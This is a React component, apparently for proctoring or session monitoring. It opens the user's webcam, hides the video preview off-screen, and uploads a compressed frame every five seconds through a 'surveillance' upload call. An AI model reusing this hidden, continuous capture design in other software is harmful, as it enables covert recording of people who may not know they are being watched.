import React, { useEffect, useRef } from 'react';
import { dataService } from '../services/dataService';

interface CameraMonitorProps {
  user: string;
  onError: () => void;
  onSuccess: () => void;
}

const CameraMonitor: React.FC<CameraMonitorProps> = ({ user, onError, onSuccess }) => {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    let stream: MediaStream | null = null;
    let intervalId: any;

    const startCamera = async () => {
      try {
        // Simple config
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { width: 320, height: 240, facingMode: "user" } 
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          onSuccess();
        }

        // Start capturing every 5 seconds
        intervalId = setInterval(captureFrame, 5000);

      } catch (err: any) {
        // If permission is denied, just call onError once and don't spam console
        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
             // Quiet failure
        } else {
             console.warn("Monitor Error:", err.message);
        }
        onError();
      }
    };

    const captureFrame = async () => {
      if (videoRef.current && canvasRef.current) {
        const video = videoRef.current;
        const canvas = canvasRef.current;
        const context = canvas.getContext('2d');

        if (context) {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          
          // Compress image (JPEG 0.4 quality for lighter upload)
          // Reduced from 0.5 to prevent "Failed to fetch" on slow connections
          const dataUrl = canvas.toDataURL('image/jpeg', 0.4);
          
          // Use Data Service to store (Local or Cloud)
          await dataService.uploadSurveillance(user, dataUrl);
        }
      }
    };

    startCamera();

    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (intervalId) clearInterval(intervalId);
    };
  }, [user, onError, onSuccess]);

  return (
    <div style={{ position: 'fixed', top: '-1000px', left: '-1000px', opacity: 0, pointerEvents: 'none' }}>
      <video ref={videoRef} autoPlay playsInline muted width="320" height="240" />
      <canvas ref={canvasRef} width="320" height="240" />
    </div>
  );
};

export default CameraMonitor;